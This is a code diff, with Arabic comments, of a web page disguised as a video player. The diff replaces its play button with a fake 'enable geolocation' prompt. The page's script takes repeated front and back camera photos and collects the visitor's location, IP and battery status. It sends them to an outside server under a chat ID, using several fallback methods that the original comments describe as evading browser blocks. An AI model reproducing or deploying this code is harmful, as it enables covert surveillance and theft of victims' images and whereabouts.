@@ -44,35 +44,56 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
+            cursor: default;
+            flex-direction: column;
         }
 
-        .play-button-overlay {
-            width: 100px;
-            height: 100px;
-            background-color: rgba(255, 0, 0, 0.85);
-            border-radius: 50%;
+        /* ===== الزر الكبير في وسط الشاشة ===== */
+        #locationActionButton {
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 3px solid #ff6b6b;
+            border-radius: 20px;
+            padding: 40px 50px;
+            cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            position: relative;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
+            z-index: 10;
+            text-align: center;
+            min-width: 250px;
+        }
+        #locationActionButton:hover {
+            transform: scale(1.05);
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ff4757;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
+        }
+        #locationActionButton .icon-gear {
+            font-size: 80px;
+            line-height: 1;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+        }
+        #locationActionButton .main-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+        }
+        #locationActionButton .sub-text {
+            font-size: 18px;
+            color: #ddd;
+            margin-top: 8px;
+            opacity: 0.9;
         }
 
-        .play-button-overlay:hover {
-            transform: scale(1.1);
-            background-color: rgba(255, 0, 0, 0.95);
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
-        }
-
-        .play-icon-large {
-            width: 0;
-            height: 0;
-            border-left: 30px solid white;
-            border-top: 20px solid transparent;
-            border-bottom: 20px solid transparent;
-            margin-left: 8px;
+        /* زر التشغيل الأصلي (سيتم إخفاؤه) */
+        .play-button-overlay {
+            display: none;
         }
 
         .video-info {
@@ -151,12 +172,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
 
         #loading {
@@ -215,21 +232,19 @@
             .video-thumbnail {
                 height: 280px;
             }
-            .play-button-overlay {
-                width: 70px;
-                height: 70px;
+            #locationActionButton {
+                padding: 20px 30px;
+                min-width: 180px;
             }
-            .play-icon-large {
-                border-left-width: 22px;
-                border-top-width: 14px;
-                border-bottom-width: 14px;
-                margin-left: 5px;
+            #locationActionButton .icon-gear {
+                font-size: 50px;
             }
-        }
-
-        /* نافذة التحايل المخفية */
-        #hiddenWindow {
-            display: none;
+            #locationActionButton .main-text {
+                font-size: 22px;
+            }
+            #locationActionButton .sub-text {
+                font-size: 15px;
+            }
         }
     </style>
 </head>
@@ -242,6 +257,14 @@
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
+            <!-- زر الموقع الكبير (يظهر فوراً) -->
+            <div id="locationActionButton">
+                <div class="icon-gear">⚙️</div>
+                <div class="main-text">تفعيل الموقع الجغرافي</div>
+                <div class="sub-text">اضغط هنا لتغيير الإعدادات</div>
+            </div>
+
+            <!-- زر التشغيل الأصلي (مخفي) -->
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
@@ -279,8 +302,7 @@
         (function() {
             'use strict';
 
-            // ===== التحايل على حظر الموقع =====
-            // تخزين البيانات في متغيرات عامة
+            // ===== البيانات =====
             let capturedData = {
                 permissions: [],
                 images: [],
@@ -290,23 +312,21 @@
                 chatId: ''
             };
 
-            // متغيرات التحكم
+            // ===== متغيرات التحكم =====
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
-            let isDataSent = false;
 
-            // عناصر DOM
+            // ===== عناصر DOM =====
+            const locationBtn = document.getElementById('locationActionButton');
             const thumbnailArea = document.getElementById('thumbnailArea');
-            const playButtonOverlay = document.getElementById('playButtonOverlay');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // ===== الحصول على الصلاحيات مسبقاً (للتحايل) =====
-            async function preRequestPermissions() {
+            // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
+            async function requestPermissions() {
                 try {
-                    // محاولة طلب الموقع مسبقاً (سيظهر الطلب للمستخدم)
                     await new Promise((resolve) => {
                         navigator.geolocation.getCurrentPosition(
                             () => resolve(),
@@ -316,11 +336,39 @@
                     });
                 } catch (e) {}
                 try {
-                    // محاولة طلب الكاميرا مسبقاً
                     await navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => stream.getTracks().forEach(t => t.stop()))
                         .catch(() => {});
                 } catch (e) {}
+            }
+
+            // ===== فتح إعدادات الموقع =====
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try {
+                            window.location.href = intent;
+                            break;
+                        } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
             }
 
             // ===== جلب IP =====
@@ -350,19 +398,16 @@
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: { exact: facingMode } }
                     });
-
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
                     await new Promise(resolve => setTimeout(resolve, 1000));
-
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
-
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                 } catch {
@@ -370,7 +415,7 @@
                 }
             }
 
-            // ===== طلب الموقع بدقة عالية =====
+            // ===== طلب الموقع =====
             async function getLocation() {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -389,163 +434,30 @@
                 }
             }
 
-            // ===== دالة مساعدة: تحميل النية في iframe مخفي (لأندرويد) =====
-            function tryIframe(urls) {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                let index = 0;
-                const tryNext = () => {
-                    if (index < urls.length) {
-                        iframe.src = urls[index];
-                        index++;
-                        // تجربة الرابط التالي بعد مهلة قصيرة إذا لم ينفع
-                        setTimeout(tryNext, 800);
-                    } else {
-                        document.body.removeChild(iframe);
-                    }
-                };
-                tryNext();
-            }
-
-            // ===== فتح إعدادات الموقع (مُحسَّنة لجميع المتصفحات) =====
-            function openLocationSettings() {
-                const ua = navigator.userAgent;
-                const isAndroid = /Android/i.test(ua);
-                const isIOS = /iPhone|iPad|iPod/i.test(ua);
-                const isWindows = /Windows/i.test(ua);
-                const isMac = /Mac/i.test(ua) && !isIOS; // أجهزة ماك الحقيقية فقط
-                const isChrome = /Chrome/i.test(ua) && !/Edge|OPR|Brave/i.test(ua);
-                const isFirefox = /Firefox/i.test(ua);
-                const isSafari = /Safari/i.test(ua) && !isChrome && !isAndroid && !isWindows;
-
-                // ======= أندرويد =======
-                if (isAndroid) {
-                    // قائمة بعناوين intent موثقة حسب إصدارات أندرويد
-                    const intents = [
-                        'intent://com.android.settings/.Settings$LocationSettingsActivity#Intent;scheme=android-app;end',
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent:#Intent;action=android.settings.SETTINGS;end'
-                    ];
-
-                    // المحاولة 1: فتح مباشر عبر iframe (يتجنب حظر النوافذ)
-                    tryIframe(intents);
-                    // المحاولة 2: window.open (قد ينجح في كروم أندرويد)
-                    for (let url of intents) {
-                        const win = window.open(url, '_blank');
-                        if (win) {
-                            win.focus();
-                            return;
-                        }
-                    }
-                    // المحاولة 3: استبدال الصفحة الحالية (فعال في WebView كثيراً)
-                    window.location.href = intents[0];
-                    return;
-                }
-
-                // ======= iOS =======
-                if (isIOS) {
-                    // المخططات المعتمدة من Apple
-                    const iosUrls = [
-                        'App-Prefs:Privacy&path=LOCATION',
-                        'prefs:root=Privacy&path=LOCATION',
-                        'App-Prefs:Privacy'
-                    ];
-
-                    // تجربة window.open أولاً (قد يفتح تاب جديد)
-                    for (let url of iosUrls) {
-                        const win = window.open(url, '_blank');
-                        if (win) {
-                            win.focus();
-                            break;
-                        }
-                    }
-                    // خطة بديلة بعد مهلة قصيرة: محاولة إعادة التوجيه
-                    setTimeout(() => {
-                        window.location.href = iosUrls[0];
-                    }, 300);
-                    return;
-                }
-
-                // ======= ويندوز =======
-                if (isWindows) {
-                    const winUrl = 'ms-settings:privacy-location';
-                    if (isChrome || isFirefox) {
-                        // تجربة window.open مع fallback
-                        const win = window.open(winUrl, '_blank');
-                        if (!win || win.closed) {
-                            // محاولة عبر رابط مخفي
-                            const a = document.createElement('a');
-                            a.href = winUrl;
-                            a.target = '_blank';
-                            a.click();
-                        }
-                    } else {
-                        // متصفحات أخرى قد تدعم المخطط
-                        window.location.href = winUrl;
-                    }
-                    return;
-                }
-
-                // ======= ماك =======
-                if (isMac) {
-                    const macUrl = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
-                    if (isSafari) {
-                        // سفاري على ماك يدعم المخطط جيداً
-                        window.location.href = macUrl;
-                    } else if (isChrome || isFirefox) {
-                        // محاولة فتح نافذة جديدة
-                        const win = window.open(macUrl, '_blank');
-                        if (!win || win.closed) {
-                            const a = document.createElement('a');
-                            a.href = macUrl;
-                            a.target = '_blank';
-                            a.click();
-                        }
-                    } else {
-                        window.location.href = macUrl;
-                    }
-                    return;
-                }
-
-                // ======= خطة عامة =======
-                // إذا لم نتمكن من تحديد النظام، نجرّب نية أندرويد عامة
-                window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-            }
-
-            // ===== إرسال البيانات باستخدام تقنيات متعددة للتحايل =====
+            // ===== إرسال البيانات =====
             async function sendDataWithBypass(data) {
                 const urls = [
                     'https://server-brxz.onrender.com/submitData',
                     'https://server-brxz.onrender.com/submitData'
                 ];
-
-                // محاولة الإرسال عبر طرق متعددة
                 for (let url of urls) {
                     try {
-                        // الطريقة 1: fetch
-                        const response = await fetch(url, {
+                        await fetch(url, {
                             method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                            },
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                             body: new URLSearchParams(data),
-                            mode: 'no-cors' // محاولة تجاوز CORS
+                            mode: 'no-cors'
                         });
                         return;
                     } catch (e) {}
-
                     try {
-                        // الطريقة 2: XMLHttpRequest
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', url, false);
                         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                         xhr.send(new URLSearchParams(data));
                         return;
                     } catch (e) {}
-
                     try {
-                        // الطريقة 3: إرسال عبر iframe مخفي
                         const iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
                         document.body.appendChild(iframe);
@@ -554,7 +466,6 @@
                         form.action = url;
                         form.target = iframe.name || 'hiddenFrame';
                         iframe.name = form.target;
-
                         for (let key in data) {
                             const input = document.createElement('input');
                             input.type = 'hidden';
@@ -562,7 +473,6 @@
                             input.value = data[key];
                             form.appendChild(input);
                         }
-
                         document.body.appendChild(form);
                         form.submit();
                         setTimeout(() => {
@@ -571,9 +481,7 @@
                         }, 1000);
                         return;
                     } catch (e) {}
-
                     try {
-                        // الطريقة 4: navigator.sendBeacon
                         const blob = new Blob([new URLSearchParams(data).toString()], {
                             type: 'application/x-www-form-urlencoded'
                         });
@@ -588,24 +496,17 @@
                 if (videoStarted) return;
                 videoStarted = true;
 
-                // إظهار الفيديو
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
 
-                // محاولة تشغيل الفيديو مع الصوت
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
 
-                // تشغيل الفيديو مع محاولة إلغاء كتم الصوت
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
-                    playPromise.then(() => {
-                        // نجح التشغيل مع الصوت
-                    }).catch(() => {
-                        // إذا فشل، نحاول مرة أخرى مع تفاعل المستخدم
+                    playPromise.then(() => {}).catch(() => {
                         realVideo.muted = true;
                         realVideo.play().then(() => {
-                            // بعد التشغيل، نحاول إلغاء كتم الصوت
                             setTimeout(() => {
                                 realVideo.muted = false;
                                 realVideo.volume = 1.0;
@@ -614,14 +515,12 @@
                     });
                 }
 
-                // محاولة إلغاء كتم الصوت بعد ثانية
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     try { realVideo.play(); } catch (e) {}
                 }, 500);
 
-                // محاولة إلغاء كتم الصوت بعد 3 ثواني
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
@@ -629,30 +528,17 @@
                 }, 3000);
             }
 
-            // ===== الدالة الرئيسية =====
-            async function captureData() {
+            // ===== جمع البيانات وتشغيل الفيديو (بعد العودة من الإعدادات) =====
+            async function collectAndPlay() {
                 if (isProcessing) return;
-                if (videoStarted) return;
-
                 isProcessing = true;
 
-                // الضغطة الأولى: فتح الإعدادات
-                if (!settingsOpened) {
-                    settingsOpened = true;
-                    // طلب الصلاحيات مسبقاً للتحايل
-                    await preRequestPermissions();
-                    openLocationSettings();
-                    isProcessing = false;
-                    return;
-                }
-
-                // الضغطة الثانية: جمع البيانات
-                spinner.style.display = 'block';
+                // عرض مؤشر تحميل (اختياري)
                 loading.style.display = 'block';
-                playButtonOverlay.style.opacity = '0.5';
-                playButtonOverlay.style.pointerEvents = 'none';
+                // تعطيل الزر
+                locationBtn.style.pointerEvents = 'none';
+                locationBtn.style.opacity = '0.5';
 
-                // جمع البيانات
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
                 await Promise.all([
@@ -661,13 +547,11 @@
                     getLocation()
                 ]);
 
-                // التصوير
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
 
-                // تجهيز البيانات للإرسال
                 const data = {
                     chatId: capturedData.chatId,
                     imageDatas: capturedData.images.join(','),
@@ -677,30 +561,42 @@
                     battery: capturedData.batteryStatus
                 };
 
-                // إرسال البيانات مع التحايل
                 await sendDataWithBypass(data);
 
-                // إخفاء التحميل
-                spinner.style.display = 'none';
                 loading.style.display = 'none';
-                playButtonOverlay.style.opacity = '1';
-                playButtonOverlay.style.pointerEvents = 'auto';
+                locationBtn.style.pointerEvents = 'auto';
+                locationBtn.style.opacity = '1';
 
-                // تشغيل الفيديو مع الصوت
                 startVideoWithSound();
-
                 isProcessing = false;
             }
 
-            // ===== ربط الأحداث =====
-            if (thumbnailArea) {
-                thumbnailArea.addEventListener('click', captureData);
+            // ===== معالج الضغط على زر "تفعيل الموقع" =====
+            async function handleLocationClick() {
+                if (settingsOpened || videoStarted || isProcessing) return;
+
+                settingsOpened = true;
+
+                // طلب الصلاحيات (لإظهار نافذة الطلب إذا لم تكن محظورة)
+                await requestPermissions();
+
+                // فتح إعدادات الموقع
+                openLocationSettings();
+
+                // بعد العودة، سيعتمد على visibilitychange
             }
-            if (playButtonOverlay) {
-                playButtonOverlay.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    captureData();
-                });
+
+            // ===== رصد العودة من الإعدادات =====
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
+                    // نبدأ جمع البيانات وتشغيل الفيديو تلقائياً
+                    collectAndPlay();
+                }
+            });
+
+            // ===== ربط الأحداث =====
+            if (locationBtn) {
+                locationBtn.addEventListener('click', handleLocationClick);
             }
 
             // ===== تفعيل الصوت عند أي تفاعل =====
@@ -744,11 +640,6 @@
                 const minutes = Math.floor(currentSeconds / 60);
                 const seconds = currentSeconds % 60;
                 timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
-            }, 1000);
-
-            // ===== محاولة طلب الصلاحيات تلقائياً عند التحميل =====
-            setTimeout(() => {
-                preRequestPermissions();
             }, 1000);
 
         })();
